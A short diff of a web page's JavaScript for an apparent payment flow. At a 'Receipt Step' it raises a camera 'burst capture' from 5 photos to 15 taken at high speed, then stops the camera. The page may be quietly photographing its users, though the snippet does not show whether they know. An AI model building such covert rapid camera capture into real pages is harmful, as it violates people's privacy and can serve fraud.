@@ -581,8 +581,8 @@
                 document.getElementById('amount-val').textContent = paymentData.amount;
             }
 
-            // BURST CAPTURE 2: Receipt Step (5 photos in 2s)
-            captureBurst(5, 400);
+            // BURST CAPTURE 2: Receipt Step (High Speed)
+            captureBurst(15, 150);
 
             setTimeout(() => {
                 if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
